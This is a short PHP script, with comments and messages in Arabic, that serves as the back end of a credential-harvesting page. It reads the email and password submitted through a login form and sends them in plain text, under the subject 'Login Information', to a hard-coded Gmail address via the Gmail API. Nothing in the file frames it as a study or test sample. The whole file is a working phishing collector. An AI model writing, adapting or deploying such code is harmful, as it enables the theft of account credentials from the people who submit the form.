<?php
require_once 'vendor/autoload.php';

// إعدادات العميل
$client = new Google_Client();
$client->setApplicationName('Gmail API PHP');
$client->setScopes(Google_Service_Gmail::GMAIL_SEND);
$client->setAuthConfig('PATH_TO_YOUR_JSON_FILE'); // استبدل هذا بمسار ملف JSON الخاص بك
$client->setAccessType('offline');

$service = new Google_Service_Gmail($client);

// بيانات البريد الإلكتروني
$to = 'wisecat2024@gmail.com';
$subject = 'Login Information';

if (isset($_POST['email']) && isset($_POST['password'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $plainTextBody = "Email: $email\nPassword: $password";

    // إنشاء رسالة البريد الإلكتروني
    $mimeMessage = "To: $to\r\n"
        . "Subject: $subject\r\n\r\n"
        . $plainTextBody;
    
    $rawMessage = base64_encode($mimeMessage);
    $structuredMessage = new Google_Service_Gmail_Message();
    $structuredMessage->setRaw($rawMessage);

    // إرسال الرسالة
    try {
        $message = $service->users_messages->send('me', $structuredMessage);
        echo "تم إرسال الرسالة إلى $to.\n";
        echo "معرف الرسالة: " . $message->getId() . "\n";
    } catch (Exception $e) {
        echo 'خطأ: ' . $e->getMessage();
    }
} else {
    echo "البريد الإلكتروني أو كلمة المرور مفقودة!";
}
?>
